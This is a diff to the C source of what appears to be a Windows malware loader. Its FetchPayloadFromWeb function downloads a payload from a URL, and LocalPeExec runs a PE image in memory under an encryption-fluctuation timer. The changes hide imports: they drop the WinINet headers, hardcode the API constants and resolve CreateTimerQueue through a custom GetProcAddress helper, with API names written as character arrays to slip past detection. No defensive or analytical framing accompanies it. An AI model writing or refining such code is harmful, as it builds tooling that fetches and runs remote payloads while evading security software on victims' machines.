@@ -1,12 +1,9 @@
 #include <stdio.h>
 #include <Windows.h>
-#include <winternl.h>
-#include <wininet.h>
 
 #include "helpers.h"
 #include "antie.h"
 
-//#pragma comment(lib, "wininet")
 
 #define PRINT_WINAPI_ERR(cApiName) printf("[!] %s Failed With Error: %d\n", cApiName, GetLastError())
 
@@ -74,7 +71,9 @@ BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFile
 
 	tInternetOpenA pInternetOpenA = (tInternetOpenA)hlpGetProcAddress(winMod, sInternetOpenA);
 	
-	if (!(hInternet = pInternetOpenA(cUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)))
+	DWORD InternetOpenTypePreConfig = 0;
+
+	if (!(hInternet = pInternetOpenA(cUserAgent, InternetOpenTypePreConfig, NULL, NULL, 0)))
 	{
 		PRINT_WINAPI_ERR(sInternetOpenA);
 		return FALSE;
@@ -84,7 +83,11 @@ BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFile
 
 	tInternetOpenUrlA pInternetOpenUrlA = (tInternetOpenUrlA)hlpGetProcAddress(winMod, sInternetOpenUrlA);
 
-	if (!(hInternetFile = pInternetOpenUrlA(hInternet, sURL, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_NO_CACHE_WRITE, 0)))
+	DWORD InternetFlagSecure = 0x00800000;
+	DWORD InternetFlagHyperLink = 0x00000400;
+	DWORD InternetFlagNoCacheWrite = 0x04000000;
+
+	if (!(hInternetFile = pInternetOpenUrlA(hInternet, sURL, NULL, 0, InternetFlagSecure | InternetFlagHyperLink | InternetFlagNoCacheWrite, 0)))
 	{
 		PRINT_WINAPI_ERR(sInternetOpenA);
 		if (hInternet)
@@ -152,7 +155,9 @@ BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFile
 	char sInternetSetOptionA[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', 'A', '\0' };
 	tInternetSetOptionA pInternetSetOptionA = (tInternetSetOptionA)hlpGetProcAddress(winMod, sInternetSetOptionA);
 
-	if (!pInternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0))
+	DWORD InternetOptionSettingsChanged = 39;
+
+	if (!pInternetSetOptionA(NULL, InternetOptionSettingsChanged, NULL, 0))
 	{
 		PRINT_WINAPI_ERR(sInternetSetOptionA);
 		if (hInternet)
@@ -548,8 +553,9 @@ BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
 
 	//printf("[*] Queuing encryption fluctuation timer\n");
 	//printf("\t> Exec Mem 0x%p | Size [ %ld ]\n", (PVOID)g_uPeRXAddress, (ULONG)g_sPeRXSize);
+	tCreateTimerQueue pCreateTimerQueue = (tCreateTimerQueue)hlpGetProcAddress(kern32, "CreateTimerQueue");
 	if (g_hTimerQueue == INVALID_HANDLE_VALUE)
-		g_hTimerQueue = CreateTimerQueue();
+		g_hTimerQueue = pCreateTimerQueue();
 
 	char sCreateTimerQueueTimer[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'i', 'm', 'e', 'r', 'Q', 'u', 'e', 'u', 'e', 'T', 'i', 'm', 'e', 'r', '\0' };
 	tCreateTimerQueueTimer pCreateTimerQueueTimer = (tCreateTimerQueueTimer)hlpGetProcAddress(kern32, sCreateTimerQueueTimer);
